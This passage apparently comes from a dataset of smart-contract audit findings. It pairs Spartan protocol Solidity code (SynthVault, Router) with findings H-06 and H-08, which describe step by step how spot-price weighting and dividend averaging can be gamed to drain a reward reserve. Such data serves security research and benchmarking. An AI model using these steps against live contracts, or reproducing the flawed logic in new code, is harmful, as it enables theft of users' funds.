   }\n}\n\n\n   \n\n// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./interfaces/iBEP20.sol\";\nimport \"./interfaces/iDAO.sol\";\nimport \"./interfaces/iBASE.sol\";\nimport \"./interfaces/iPOOL.sol\";\nimport \"./interfaces/iSYNTH.sol\";\nimport \"./interfaces/iUTILS.sol\";\nimport \"./interfaces/iRESERVE.sol\";\nimport \"./interfaces/iSYNTHFACTORY.sol\";\nimport \"./interfaces/iPOOLFACTORY.sol\";\n\ncontract SynthVault {\n    address public BASE;\n    address public DEPLOYER;\n\n    uint256 public minimumDepositTime;  // Withdrawal & Harvest lockout period; intended to be 1 hour\n    uint256 public totalWeight;         // Total weight of the whole SynthVault\n    uint256 public erasToEarn;          // Amount of eras that make up the targeted RESERVE depletion; regulates incentives\n    uint256 public vaultClaim;          // The SynthVaults's portion of rewards; intended to be ~10% initially\n    address [] public stakedSynthAssets; // Array of all synth assets that have ever been staked in (scope: vault)\n    uint private lastMonth;             // Timestamp of the start of current metric period (For UI)\n    uint public genesis;                // Timestamp from when the synth was first deployed (For UI)\n\n    uint256 public map30DVaultRevenue; // Tally of revenue during current incomplete metric period (for UI)\n    uint256 public mapPast30DVaultRevenue; // Tally of revenue from last full metric period (for UI)\n    uint256 [] public revenueArray; // Array of the last two metric periods (For UI)\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == _DAO().DAO() || msg.sender == DEPLOYER);\n        _;\n    }\n\n    constructor(address _base) {\n        BASE = _base;\n        DEPLOYER = msg.sender;\n        erasToEarn = 30;\n        minimumDepositTime = 3600; // 1 hour\n        vaultClaim = 1000;\n        genesis = block.timestamp;\n        lastMonth = 0;\n    }\n\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    mapping(address => mapping(address => uint256)) private mapMemberSynth_weight;\n    mapping(address => uint256) private mapMemberTotal_weight;\n    mapping(address => mapping(address => uint256)) private mapMemberSynth_deposit;\n\n    mapping(address => mapping(address => uint256)) private mapMemberSynth_lastTime;\n    mapping(address => uint256) private mapMember_depositTime;\n    mapping(address => uint256) public lastBlock;\n    mapping(address => bool) private isStakedSynth;\n    mapping(address => mapping(address => bool)) private isSynthMember;\n\n    event MemberDeposits(\n        address indexed synth,\n        address indexed member,\n        uint256 newDeposit,\n        uint256 weight,\n        uint256 totalWeight\n    );\n    event MemberWithdraws(\n        address indexed synth,\n        address indexed member,\n        uint256 amount,\n        uint256 weight,\n        uint256 totalWeight\n    );\n    event MemberHarvests(\n        address indexed synth,\n        address indexed member,\n        uint256 amount,\n        uint256 weight,\n        uint256 totalWeight\n    );\n\n    function setParams(uint256 one, uint256 two, uint256 three) external onlyDAO {\n        erasToEarn = one;\n        minimumDepositTime = two;\n        vaultClaim = three;\n    }\n\n    //====================================== DEPOSIT ========================================//\n\n    // User deposits Synths in the SynthVault\n    function deposit(address synth, uint256 amount) external {\n        depositForMember(synth, msg.sender, amount);\n    }\n\n    // Contract deposits Synths in the SynthVault for user\n    function depositForMember(address synth, address member, uint256 amount) public {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synth), \"!synth\"); // Must be a valid synth\n        require(iBEP20(synth).transferFrom(msg.sender, address(this), amount)); // Must successfuly transfer in\n        _deposit(synth, member, amount); // Assess and record the deposit\n    }\n\n    // Check and record the deposit\n    function _deposit(address _synth, address _member, uint256 _amount) internal {\n        if(!isStakedSynth[_synth]){\n            isStakedSynth[_synth] = true; // Record as a staked synth\n            stakedSynthAssets.push(_synth); // Add to staked synth array\n        }\n        mapMemberSynth_lastTime[_member][_synth] = block.timestamp + minimumDepositTime; // Record deposit time (scope: member -> synth)\n        mapMember_depositTime[_member] = block.timestamp + minimumDepositTime; // Record deposit time (scope: member)\n        mapMemberSynth_deposit[_member][_synth] += _amount; // Record balance for member\n        uint256 _weight = iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(_synth).LayerONE(), _amount); // Get the SPARTA weight of the deposit\n        mapMemberSynth_weight[_member][_synth] += _weight; // Add the weight to the user (scope: member -> synth)\n        mapMemberTotal_weight[_member] += _weight; // Add to the user's total weight (scope: member)\n        totalWeight += _weight; // Add to the total weight (scope: vault)\n        isSynthMember[_member][_synth] = true; // Record user as a member\n        emit MemberDeposits(_synth, _member, _amount, _weight, totalWeight);\n    }\n\n    //====================================== HARVEST ========================================//\n\n    // User harvests all of their available rewards\n    function harvestAll() external returns (bool) {\n        for(uint i = 0; i < stakedSynthAssets.length; i++){\n            if((block.timestamp > mapMemberSynth_lastTime[msg.sender][stakedSynthAssets[i]])){\n                uint256 reward = calcCurrentReward(stakedSynthAssets[i], msg.sender);\n                if(reward > 0){\n                    harvestSingle(stakedSynthAssets[i]);\n                }\n            }\n            \n        }\n        return true;\n    }\n\n    // User harvests available rewards of the chosen asset\n    function harvestSingle(address synth) public returns (bool) {\n        require(iSYNTHFACTORY(_DAO().SYNTHFACTORY()).isSynth(synth), \"!synth\"); // Must be valid synth\n        require(iRESERVE(_DAO().RESERVE()).emissions(), \"!emissions\"); // RESERVE emissions must be on\n        uint256 _weight;\n        uint256 reward = calcCurrentReward(synth, msg.sender); // Calc user's current SPARTA reward\n        mapMemberSynth_lastTime[msg.sender][synth] = block.timestamp; // Set last harvest time as now\n        address _poolOUT = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(iSYNTH(synth).LayerONE()); // Get pool address\n        iRESERVE(_DAO().RESERVE()).grantFunds(reward, _poolOUT); // Send the SPARTA from RESERVE to POOL\n        (uint synthReward,) = iPOOL(_poolOUT).mintSynth(synth, address(this)); // Mint synths & tsf to SynthVault\n        _weight = iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(synth).LayerONE(), synthReward); // Calc reward's SPARTA value\n        mapMemberSynth_deposit[msg.sender][synth] += synthReward; // Record deposit for the user (scope: member -> synth)\n        mapMemberSynth_weight[msg.sender][synth] += _weight; // Add the weight to the user (scope: member -> synth)\n        mapMemberTotal_weight[msg.sender] += _weight; // Add to the user's total weight (scope: member)\n        totalWeight += _weight; // Add to the total weight (scope: vault)\n        _addVaultMetrics(reward); // Add to the revenue metrics (for UI)\n        iSYNTH(synth).realise(_poolOUT); // Check synth-held LP value for premium; burn if so\n        emit MemberHarvests(synth, msg.sender, reward, _weight, totalWeight);\n        return true;\n    }\n\n    // Calculate the user's current incentive-claim per era based on selected asset\n    function calcCurrentReward(address synth, address member) public view returns (uint256 reward){\n        require((block.timestamp > mapMemberSynth_lastTime[member][synth]), \"!unlocked\"); // Must not harvest before lockup period passed\n        uint256 _secondsSinceClaim = block.timestamp - mapMemberSynth_lastTime[member][synth]; // Get seconds passed since last claim\n        uint256 _share = calcReward(synth, member); // Get member's share of RESERVE incentives\n        reward = (_share * _secondsSinceClaim) / iBASE(BASE).secondsPerEra(); // User's share times eras since they last claimed\n        return reward;\n    }\n\n    // Calculate the user's current total claimable incentive\n    function calcReward(address synth, address member) public view returns (uint256) {\n        uint256 _weight = mapMemberSynth_weight[member][synth]; // Get user's weight (scope: member -> synth)\n        uint256 _reserve = reserveBASE() / erasToEarn; // Aim to deplete reserve over a number of days\n        uint256 _vaultReward = (_reserve * vaultClaim) / 10000; // Get the SynthVault's share of that\n        return iUTILS(_DAO().UTILS()).calcShare(_weight, totalWeight, _vaultReward); // Get member's share of that\n    }\n\n    //====================================== WITHDRAW ========================================//\n\n    // User withdraws a percentage of their synths from the vault\n    function withdraw(address synth, uint256 basisPoints) external returns (uint256 redeemedAmount) {\n        redeemedAmount = _processWithdraw(synth, msg.sender, basisPoints); // Perform the withdrawal\n        require(iBEP20(synth).transfer(msg.sender, redeemedAmount)); // Transfer from SynthVault to user\n        return redeemedAmount;\n    }\n\n    // Contract withdraws a percentage of user's synths from the vault\n    function _processWithdraw(address _synth, address _member, uint256 _basisPoints) internal returns (uint256 synthReward) {\n        require((block.timestamp > mapMember_depositTime[_member]), \"lockout\"); // Must not withdraw before lockup period passed\n        uint256 _principle = iUTILS(_DAO().UTILS()).calcPart(_basisPoints, mapMemberSynth_deposit[_member][_synth]); // Calc amount to withdraw\n        mapMemberSynth_deposit[_member][_synth] -= _principle; // Remove from user's recorded vault holdings\n        uint256 _weight = iUTILS(_DAO().UTILS()).calcPart(_basisPoints, mapMemberSynth_weight[_member][_synth]); // Calc SPARTA value of amount\n        mapMemberTotal_weight[_member] -= _weight; // Remove from member's total weight (scope: member)\n        mapMemberSynth_weight[_member][_synth] -= _weight; // Remove from member's synth weight (scope: member -> synth)\n        totalWeight -= _weight; // Remove from total weight (scope: vault)\n        emit MemberWithdraws(_synth, _member, synthReward, _weight, totalWeight);\n        return (_principle + synthReward);\n    }\n\n    //================================ Helper Functions ===============================//\n\n    function reserveBASE() public view returns (uint256) {\n        return iBEP20(BASE).balanceOf(_DAO().RESERVE());\n    }\n\n    function getMemberDeposit(address synth, address member) external view returns (uint256){\n        return mapMemberSynth_deposit[member][synth];\n    }\n\n    function getMemberWeight(address member) external view returns (uint256) {\n        return mapMemberTotal_weight[member];\n    }\n\n    function getStakeSynthLength() external view returns (uint256) {\n        return stakedSynthAssets.length;\n    }\n\n    function getMemberLastTime(address member) external view returns (uint256) {\n        return mapMember_depositTime[member];\n    }\n\n    function getMemberLastSynthTime(address synth, address member) external view returns (uint256){\n        return mapMemberSynth_lastTime[member][synth];\n    }\n\n    function getMemberSynthWeight(address synth, address member) external view returns (uint256) {\n        return mapMemberSynth_weight[member][synth];\n    }\n\n    //=============================== SynthVault Metrics =================================//\n\n    function _addVaultMetrics(uint256 _fee) internal {\n        if(lastMonth == 0){\n            lastMonth = block.timestamp;\n        }\n        if(block.timestamp <= lastMonth + 2592000){ // 30 days\n            map30DVaultRevenue = map30DVaultRevenue + _fee;\n        } else {\n            lastMonth = block.timestamp;\n            mapPast30DVaultRevenue = map30DVaultRevenue;\n            addRevenue(mapPast30DVaultRevenue);\n            map30DVaultRevenue = 0;\n            map30DVaultRevenue = map30DVaultRevenue + _fee;\n        }\n    }\n\n    function addRevenue(uint _totalRev) internal {\n        if(!(revenueArray.length == 2)){\n            revenueArray.push(_totalRev);\n        } else {\n            addFee(_totalRev);\n        }\n    }\n\n    function addFee(uint _rev) internal {\n        uint _n = revenueArray.length; // 2\n        for (uint i = _n - 1; i > 0; i--) {\n            revenueArray[i] = revenueArray[i - 1];\n        }\n        revenueArray[0] = _rev;\n    }\n}\n\n\n",
        "CodeNames": [
            "BondVault.sol",
            "Dao.sol",
            "synthVault.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-06",
                "Location": [
                    "iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(_synth).LayerONE(), _amount)",
                    "calcReward",
                    "BASE",
                    "SynthVault",
                    "token",
                    "weight"
                ],
                "Type": "  SynthVault  rewards can be gamed",
                "Description": "\nThe SynthVault._deposit function adds weight for the user that depends on the spot value of the deposit synth amount in BASE.\n\nThis spot price can be manipulated and the cost of manipulation is relative to the pool's liquidity.\nHowever, the reward (see calcReward) is measured in BASE tokens unrelated to the pool.\nTherefore, if the pool's liquidity is low and the reward reserve is high, the attack can be profitable:\n\n1. Manipulate the pool spot price of the iSYNTH(_synth).LayerONE() pool by dripping a lot of BASE into it repeatedly (sending lots of smaller trades is less costly due to the path-independence of the continuous liquidity model(https://docs.thorchain.org/thorchain-finance/continuous-liquidity-pools)). This increases the BASE per token price.\n2. Call SynthVault.depositForMember and deposit a _small_ amount of synth token. The iUTILS(_DAO().UTILS()).calcSpotValueInBase(iSYNTH(_synth).LayerONE(), _amount) will return an inflated weight due to the price.\n3. Optionally drip more BASE into the pool and repeat the deposits\n4. Drip back token to the pool to rebalance it\n\nThe user's weight is now inflated compared to the deposited / locked-up amount and they can claim a large share of the rewards. The cost of the attack depends on the pool's liquidity and the profit depends on the reserve. It could therefore be profitable under certain circumstances.\n\n",
                "Repair": "Recommend tracking a TWAP price of the synth instead, store the deposited synths instead, and compute the weight & total weight on the fly based on the TWAP * deposit amount instead of at the time of deposit.\n\nverifyfirst (Spartan) acknowledged(https://github.com/code-423n4/2021-07-spartan-findings/issues/166#issuecomment-884641152):\n  There is already a discussion in place to change spot rate to swap rate calculation for weights.\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.3;\nimport \"./Pool.sol\";\nimport \"./interfaces/iRESERVE.sol\"; \nimport \"./interfaces/iPOOLFACTORY.sol\";  \nimport \"./interfaces/iWBNB.sol\";\n\ncontract Router {\n    address public BASE;\n    address public WBNB;\n    address public DEPLOYER;\n\n    uint private maxTrades;         // Amount of dividend events per era\n    uint private eraLength;         // Dividend factor to regulate the max percentage of RESERVE balance\n    uint public normalAverageFee;   // The average fee size (dividend smoothing)\n    uint private arrayFeeSize;      // The size of the average window used for normalAverageFee\n    uint [] private feeArray;       // The array used to calc normalAverageFee\n    uint private lastMonth;         // Timestamp of the start of current metric period (For UI)\n\n    mapping(address=> uint) public mapAddress_30DayDividends;\n    mapping(address=> uint) public mapAddress_Past30DayPoolDividends;\n\n    // Restrict access\n    modifier onlyDAO() {\n        require(msg.sender == _DAO().DAO() || msg.sender == DEPLOYER);\n        _;\n    }\n\n    constructor (address _base, address _wbnb) {\n        BASE = _base;\n        WBNB = _wbnb;\n        arrayFeeSize = 20;\n        eraLength = 30;\n        maxTrades = 100;\n        lastMonth = 0;\n        DEPLOYER = msg.sender;\n    }\n\n    receive() external payable {}\n\n    function _DAO() internal view returns(iDAO) {\n        return iBASE(BASE).DAO();\n    }\n\n    // User adds liquidity\n    function addLiquidity(uint inputBase, uint inputToken, address token) external payable{\n        addLiquidityForMember(inputBase, inputToken, token, msg.sender);\n    }\n\n    // Contract adds liquidity for user\n    function addLiquidityForMember(uint inputBase, uint inputToken, address token, address member) public payable{\n        address pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token);  // Get pool address\n        _handleTransferIn(BASE, inputBase, pool); // Transfer SPARTA to pool\n        _handleTransferIn(token, inputToken, pool); // Transfer TOKEN to pool\n        Pool(pool).addForMember(member); // Add liquidity to pool for user\n    }\n\n    // Trade LP tokens for another type of LP tokens\n    function zapLiquidity(uint unitsInput, address fromPool, address toPool) external {\n        require(iPOOLFACTORY(_DAO().POOLFACTORY()).isPool(fromPool) == true); // FromPool must be a valid pool\n        require(iPOOLFACTORY(_DAO().POOLFACTORY()).isPool(toPool) == true); // ToPool must be a valid pool\n        address _fromToken = Pool(fromPool).TOKEN(); // Get token underlying the fromPool\n        address _member = msg.sender; // Get user's address\n        require(unitsInput <= iBEP20(fromPool).totalSupply()); // Input must be valid\n        iBEP20(fromPool).transferFrom(_member, fromPool, unitsInput); // Transfer LPs from user to the pool\n        Pool(fromPool).remove(); // Remove liquidity to ROUTER\n        iBEP20(_fromToken).transfer(fromPool, iBEP20(_fromToken).balanceOf(address(this))); // Transfer TOKENs from ROUTER to fromPool\n        Pool(fromPool).swapTo(BASE, toPool); // Swap the received TOKENs for SPARTA then transfer to the toPool\n        iBEP20(BASE).transfer(toPool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to toPool\n        Pool(toPool).addForMember(_member); // Add liquidity and send the LPs to user\n    }\n\n    // User adds liquidity asymetrically (one asset)\n    function addLiquiditySingle(uint inputToken, bool fromBase, address token) external payable{\n        addLiquiditySingleForMember(inputToken, fromBase, token, msg.sender);\n    }\n\n    // Contract adds liquidity asymetrically for user (one asset)\n    function addLiquiditySingleForMember(uint inputToken, bool fromBase, address token, address member) public payable{\n        require(inputToken > 0); // Must be valid input amount\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address\n        address _token = token;\n        if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB\n        if(fromBase){\n            _handleTransferIn(BASE, inputToken, _pool); // Transfer SPARTA into pool\n            Pool(_pool).addForMember(member); // Add liquidity and send LPs to user\n        } else {\n            _handleTransferIn(token, inputToken, _pool); // Transfer TOKEN into pool\n            Pool(_pool).addForMember(member); // Add liquidity and send LPs to user\n        }\n    }\n\n    // User removes liquidity - redeems a percentage of their balance\n    function removeLiquidity(uint basisPoints, address token) external{\n        require((basisPoints > 0 && basisPoints <= 10000)); // Must be valid basis points\n        uint _units = iUTILS(_DAO().UTILS()).calcPart(basisPoints, iBEP20(iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token)).balanceOf(msg.sender));\n        removeLiquidityExact(_units, token);\n    }\n\n    // User removes liquidity - redeems exact qty of LP tokens\n    function removeLiquidityExact(uint units, address token) public {\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get the pool address\n        address _member = msg.sender; // The the user's address\n        iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to the pool\n        if(token != address(0)){\n            Pool(_pool).removeForMember(_member); // Remove liquidity and send assets directly to user\n        } else {\n            Pool(_pool).remove(); // If BNB; remove liquidity and send to ROUTER instead\n            uint outputBase = iBEP20(BASE).balanceOf(address(this)); // Get the received SPARTA amount\n            uint outputToken = iBEP20(WBNB).balanceOf(address(this)); // Get the received WBNB amount\n            _handleTransferOut(token, outputToken, _member); // Unwrap to BNB & tsf it to user\n            _handleTransferOut(BASE, outputBase, _member); // Transfer SPARTA to user\n        }\n    }\n\n    // User removes liquidity asymetrically (one asset)\n    function removeLiquiditySingle(uint units, bool toBase, address token) external{\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address\n        require(iPOOLFACTORY(_DAO().POOLFACTORY()).isPool(_pool) == true); // Pool must be valid\n        address _member = msg.sender; // Get user's address\n        iBEP20(_pool).transferFrom(_member, _pool, units); // Transfer LPs to pool\n        Pool(_pool).remove(); // Remove liquidity & tsf to ROUTER\n        address _token = token; // Get token address\n        if(token == address(0)){_token = WBNB;} // Handle BNB -> WBNB\n        if(toBase){\n            iBEP20(_token).transfer(_pool, iBEP20(_token).balanceOf(address(this))); // Transfer TOKEN to pool\n            Pool(_pool).swapTo(BASE, _member); // Swap TOKEN for SPARTA & tsf to user\n        } else {\n            iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA to pool\n            Pool(_pool).swap(_token); // Swap SPARTA for TOKEN & transfer to ROUTER\n            _handleTransferOut(token, iBEP20(_token).balanceOf(address(this)), _member); // Send TOKEN to user\n        } \n    }\n\n    //============================== Swapping Functions ====================================//\n    \n    // Swap SPARTA for TOKEN\n    function buyTo(uint amount, address token, address member) public {\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get the pool address\n        _handleTransferIn(BASE, amount, _pool); // Transfer SPARTA to pool\n        uint fee;\n        if(token != address(0)){\n            (, uint feey) = Pool(_pool).swapTo(token, member); // Swap SPARTA to TOKEN & tsf to user\n            fee = feey;\n        } else {\n            (uint outputAmount, uint feez) = Pool(_pool).swap(WBNB); // Swap SPARTA to WBNB\n            _handleTransferOut(token, outputAmount, member); // Unwrap to BNB & tsf to user\n            fee = feez;\n        }\n        getsDividend(_pool, fee); // Check for dividend & tsf it to pool\n    }\n\n    // Swap TOKEN for SPARTA\n    function sellTo(uint amount, address token, address member) public payable returns (uint){\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(token); // Get pool address\n        _handleTransferIn(token, amount, _pool); // Transfer TOKEN to pool\n        (, uint fee) = Pool(_pool).swapTo(BASE, member); // Swap TOKEN to SPARTA & transfer to user\n        getsDividend(_pool, fee); // Check for dividend & tsf it to pool\n        return fee;\n    }\n\n    // User performs a simple swap (to -> from)\n    function swap(uint256 inputAmount, address fromToken, address toToken) external payable{\n        swapTo(inputAmount, fromToken, toToken, msg.sender);\n    }\n\n    // Contract checks which swap function the user will require\n    function swapTo(uint256 inputAmount, address fromToken, address toToken, address member) public payable{\n        require(fromToken != toToken); // Tokens must not be the same\n        if(fromToken == BASE){\n            buyTo(inputAmount, toToken, member); // Swap SPARTA to TOKEN & tsf to user\n        } else if(toToken == BASE) {\n            sellTo(inputAmount, fromToken, member); // Swap TOKEN to SPARTA & tsf to user\n        } else {\n            address _poolTo = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(toToken); // Get pool address\n            uint feey = sellTo(inputAmount, fromToken, _poolTo); // Swap TOKEN to SPARTA & tsf to pool\n            address _toToken = toToken;\n            if(toToken == address(0)){_toToken = WBNB;} // Handle BNB -> WBNB\n            (uint _zz, uint _feez) = Pool(_poolTo).swap(_toToken); // Swap SPARTA to TOKEN & tsf to ROUTER\n            uint fee = feey+(_feez); // Get total slip fees\n            getsDividend(_poolTo, fee); // Check for dividend & tsf it to pool\n            _handleTransferOut(toToken, _zz, member); // Transfer TOKEN to user\n        }\n    }\n\n    // Check if fee should generate a dividend & send it to the pool\n    function getsDividend(address _pool, uint fee) internal {\n        if(iPOOLFACTORY(_DAO().POOLFACTORY()).isCuratedPool(_pool) == true){\n            addTradeFee(fee); // Add fee to array for avgFee calcs etc\n            addDividend(_pool, fee); // Check and tsf dividend to pool\n        }\n    }\n\n    //============================== Token Transfer Functions ======================================//\n    \n    // Handle the transfer of assets into the pool\n    function _handleTransferIn(address _token, uint256 _amount, address _pool) internal returns(uint256 actual){\n        if(_amount > 0) {\n            if(_token == address(0)){\n                require((_amount == msg.value));\n                (bool success, ) = payable(WBNB).call{value: _amount}(\"\"); // Wrap BNB\n                require(success, \"!send\");\n                iBEP20(WBNB).transfer(_pool, _amount); // Transfer WBNB from ROUTER to pool\n                actual = _amount;\n            } else {\n                uint startBal = iBEP20(_token).balanceOf(_pool); // Get prior TOKEN balance of pool\n                iBEP20(_token).transferFrom(msg.sender, _pool, _amount); // Transfer TOKEN to pool\n                actual = iBEP20(_token).balanceOf(_pool)-(startBal); // Get received TOKEN amount\n            }\n        }\n    }\n\n    // Handle the transfer of assets out of the ROUTER\n    function _handleTransferOut(address _token, uint256 _amount, address _recipient) internal {\n        if(_amount > 0) {\n            if (_token == address(0)) {\n                iWBNB(WBNB).withdraw(_amount); // Unwrap WBNB to BNB\n                (bool success, ) = payable(_recipient).call{value:_amount}(\"\");  // Send BNB to recipient\n                require(success, \"!send\");\n            } else {\n                iBEP20(_token).transfer(_recipient, _amount); // Transfer TOKEN to recipient\n            }\n        }\n    }\n\n    //================================ Swap Synths ========================================//\n    \n    // Swap TOKEN to Synth\n    function swapAssetToSynth(uint inputAmount, address fromToken, address toSynth) external payable {\n        require(fromToken != toSynth); // Tokens must not be the same\n        address _synthLayer1 = iSYNTH(toSynth).LayerONE(); // Get underlying token's address\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(_synthLayer1); // Get relevant pool address\n        if(fromToken != BASE){\n            sellTo(inputAmount, fromToken, address(this)); // Swap TOKEN to SPARTA & tsf to ROUTER\n            iBEP20(BASE).transfer(_pool, iBEP20(BASE).balanceOf(address(this))); // Transfer SPARTA from ROUTER to pool\n        } else {\n            iBEP20(BASE).transferFrom(msg.sender, _pool, inputAmount); // Transfer SPARTA from ROUTER to pool\n        }\n        (, uint fee) = Pool(_pool).mintSynth(toSynth, msg.sender); // Mint synths & tsf to user\n        getsDividend(_pool, fee); // Check and tsf dividend to pool\n    }\n   \n    // Swap Synth to TOKEN\n    function swapSynthToAsset(uint inputAmount, address fromSynth, address toToken) external {\n        require(fromSynth != toToken); // Tokens must not be the same\n        address _synthINLayer1 = iSYNTH(fromSynth).LayerONE(); // Get synth's underlying token's address\n        address _poolIN = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(_synthINLayer1); // Get synth's relevant pool address\n        address _pool = iPOOLFACTORY(_DAO().POOLFACTORY()).getPool(toToken); // Get TOKEN's relevant pool address\n        iBEP20(fromSynth).transferFrom(msg.sender, _poolIN, inputAmount); // Transfer synth from user to pool\n        uint outputAmount; uint fee;\n        if(toToken == BASE){\n            Pool(_poolIN).burnSynth(fromSynth, msg.sender); // Swap Synths for SPARTA & tsf to user\n        } else {\n            (outputAmount,fee) = Pool(_poolIN).burnSynth(fromSynth, address(this)); // Swap Synths to SPARTA & tsf to ROUTER\n            if(toToken != address(0)){\n                (, uint feey) = Pool(_pool).swapTo(toToken, msg.sender); // Swap SPARTA to TOKEN & transfer to user\n                fee = feey + fee;\n            } else {\n                (uint outputAmountY, uint feez) = Pool(_pool).swap(WBNB); // Swap SPARTA to WBNB & tsf to ROUTER\n                _handleTransferOut(toToken, outputAmountY, msg.sender); // Unwrap to BNB & tsf to user\n                fee = feez + fee;\n            }\n        }\n        getsDividend(_pool, fee); // Check and tsf dividend to pool\n    }\n    \n    //============================= Token Dividends / Curated Pools =================================//\n    \n    // Calculate the Dividend and transfer it to the pool\n    function addDividend(address _pool, uint256 _fees) internal {\n        if(!(normalAverageFee == 0)){\n            uint reserve = iBEP20(BASE).balanceOf(_DAO().RESERVE()); // Get SPARTA balance in the RESERVE contract\n            if(!(reserve == 0)){\n                uint dailyAllocation = (reserve / eraLength) / maxTrades; // Calculate max dividend\n                uint numerator = _fees * dailyAllocation;\n                uint feeDividend = numerator / (_fees + normalAverageFee); // Calculate actual dividend\n                revenueDetails(feeDividend, _pool); // Add to revenue metrics\n                iRESERVE(_DAO().RESERVE()).grantFunds(feeDividend, _pool); // Transfer dividend from RESERVE to POOL\n                Pool(_pool).sync(); // Sync the pool balances to attribute the dividend to the existing LPers\n            }\n        }\n    }\n\n    // Add fee to feeArray, used to calculate normalAverageFee\n    function addTradeFee(uint _fee) internal {\n        uint totalTradeFees = 0;\n        uint arrayFeeLength = feeArray.length;\n        if(arrayFeeLength < arrayFeeSize){\n            feeArray.push(_fee); // Build array until it is == arrayFeeSize\n        } else {\n            addFee(_fee); // If array is required length; shift in place of oldest item\n            for(uint i = 0; i < arrayFeeSize; i++){\n                totalTradeFees = totalTradeFees + feeArray[i]; // NET sum of feeArray\n            }\n        }\n        normalAverageFee = totalTradeFees / arrayFeeSize; // Calc average fee\n    }\n\n    // Shift out oldest fee item and add newest\n    function addFee(uint _fee) internal {\n        uint n = feeArray.length; // 20\n        for (uint i = n - 1; i > 0; i--) {\n            feeArray[i] = feeArray[i - 1];\n        }\n        feeArray[0] = _fee;\n    }\n\n    function revenueDetails(uint _fees, address _pool) internal {\n        if(lastMonth == 0){\n            lastMonth = block.timestamp;\n        }\n        if(block.timestamp <= lastMonth + 2592000){ // 30 days\n            mapAddress_30DayDividends[_pool] = mapAddress_30DayDividends[_pool] + _fees;\n        } else {\n            lastMonth = block.timestamp;\n            mapAddress_Past30DayPoolDividends[_pool] = mapAddress_30DayDividends[_pool];\n            mapAddress_30DayDividends[_pool] = 0;\n            mapAddress_30DayDividends[_pool] = mapAddress_30DayDividends[_pool] + _fees;\n        }\n    }\n\n    function stringToBytes(string memory s) external pure returns (bytes memory){\n        return bytes(s);\n    }\n\n    function isEqual(bytes memory part1, bytes memory part2) external pure returns(bool equal){\n        if(sha256(part1) == sha256(part2)){\n            return true;\n        }\n    }\n    \n    //======================= Change Dividend Variables ===========================//\n\n    function changeArrayFeeSize(uint _size) external onlyDAO {\n        arrayFeeSize = _size;\n        delete feeArray;\n    }\n\n    function changeMaxTrades(uint _maxtrades) external onlyDAO {\n        maxTrades = _maxtrades;\n    }\n\n    function changeEraLength(uint _eraLength) external onlyDAO {\t\n        eraLength = _eraLength;\t\n    }\n\n    //================================== Helpers =================================//\n\n    function currentPoolRevenue(address pool) external view returns(uint256) {\n        return mapAddress_30DayDividends[pool];\n    }\n\n    function pastPoolRevenue(address pool) external view returns(uint256) {\n        return mapAddress_Past30DayPoolDividends[pool];\n    }\n}\n\n",
        "CodeNames": [
            "Router.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-08",
                "Location": [
                    "dailyAllocation",
                    "buyTo",
                    "feeDividend",
                    "arrayFeeSize",
                    "addTradeFee",
                    "addDividend",
                    "normalAverageFee"
                ],
                "Type": " Dividend reward can be gamed",
                "Description": "\nThe Router.addDividend function tells the reserve to send dividends to the pool depending on the fees.\n\nThe attacker provides LP to a curated pool. Ideally, they become a large LP holder to capture most of the profit, they should choose the smallest liquidity pool as the dividends are pool-independent.\nThe normalAverageFee variable that determines the pool dividends can be set to zero by the attacker by trading a single wei in the pool arrayFeeSize (20) times (use buyTo). The fees of the single wei trades will be zero and thus the normalAverageFee will also be zero as, see addTradeFee.\nThe attacker then does a trade that generates some non-zero fees, setting the normalAverageFee to this trade's fee. The feeDividend is then computed as _fees * dailyAllocation / (_fees + normalAverageFee) = _fees * dailyAllocation / (2 * _fees) = dailyAllocation / 2. Half of the dailyAllocation is sent to the pool.\nThe attacker repeats the above steps until the reserve is almost empty. Each time the dailyAllocation gets smaller but it's still possible to withdraw almost all of it.\nThey redeem their LP tokens and gain a share of the profits\n\nThe reserve can be emptied by the attacker.\n\nCounting only the last 20 trades as a baseline for the dividends does not work. It should probably average over a timespan but even that can be gamed if it is too short.\nI think a better idea is to compute the dividends based on volume traded over a timespan instead of looking at individual trades.\n\nverifyfirst (Spartan) acknowledged(https://github.com/code-423n4/2021-07-spartan-findings/issues/182#issuecomment-885412630):\n  Only very deep pools will be curated for dividends.\n Variables can be changed reactively to alter the dividends.\n Whilst we were aware of this and feel the attack is limited its sparked some discussion for some new ideas to solve this.\n\n\nghoul-sol (judge) commented(https://github.com/code-423n4/2021-07-spartan-findings/issues/182#issuecomment-894864375):\n  Keeping high risk as the report is valid\n\n\n",
                "Repair": ""
            }
        ]
    },
    {
